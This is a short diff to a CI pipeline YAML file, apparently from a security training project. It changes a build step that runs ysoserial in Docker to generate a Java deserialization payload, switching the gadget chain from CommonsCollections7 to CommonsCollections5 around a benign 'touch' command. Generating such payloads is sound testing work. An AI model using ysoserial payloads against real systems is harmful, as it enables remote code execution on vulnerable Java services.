@@ -12,6 +12,6 @@ pool:
 steps:
 - script: |
    docker build -t ysoserial .
-   docker run --rm ysoserial CommonsCollections7 'touch /tmp/SecureDojo' | base64
+   docker run --rm ysoserial CommonsCollections5 'touch /tmp/SecureDojo' | base64
   displayName: 'ysoserial'
 
